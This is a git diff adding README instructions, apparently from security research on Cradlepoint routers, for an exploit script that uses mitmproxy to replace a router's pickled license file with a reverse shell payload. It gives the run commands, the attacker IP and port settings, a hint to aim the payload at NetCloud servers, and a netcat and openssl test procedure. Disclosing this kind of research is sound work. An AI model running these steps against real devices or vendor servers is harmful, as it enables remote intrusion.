@@ -20,3 +20,26 @@ Quick instructions:
   - To register a device, one needs valid NetCloud credentials and the MAC Address of the router.
   - NetCloud provides an access token which the router later uses to connect to NetCloud.
   - It seems that a router which is already registered can be re-registered and a new token is generated (only the last token seems to be valid).
+
+## mitmproxy_netcloud_rce.py
+
+Mitmproxy script to replace the router's pickled license file with a reverse shell payload (see [here](../README.md#rce-through-deserializing-untrusted-data) for details).
+
+To get a shell on the router, please first follow [these](../README.md#mitm-netcloud-traffic-with-mitmproxy) instructions. Adapt `_ATTACKER_IP` and `_ATTACKER_PORT` variables in the script.
+
+Next, simply start mitmproxy:
+
+```bash
+$ mitmproxy --mode transparent --set confdir=$HOME/mitmproxy --rawtcp --tcp-hosts ".*" -s mitmproxy_netcloud_rce.py
+```
+
+To poke with the NetCloud servers, the reverse shell payload in the script won't work (just adapt it accordingly). Next, run mitmproxy the same as before.
+
+Finally, run `test_netcloud_registration.py` (see instructions above) and wait for your Cradlepoint device to send its pickled license to the NetCloud server. This bug has been already patched by Cradlepoint, but we didn't re-verify :bomb:
+
+For a simple test just use `openssl s_client`:
+
+1) In the script change the IP address to `127.0.0.1` and the payload's Python interpreter to just `python`
+2) Start mitmdump in one window: `$ mitmdump --rawtcp --tcp-hosts ".*" -s mitmproxy_netcloud_rce.py`
+3) In another window start a netcat listener
+4) Tunnel a license packet through `openssl s_client`: `$ cat license_packet_TO_netcloud.bin | openssl s_client -connect "google.com:443" -proxy localhost:8080`
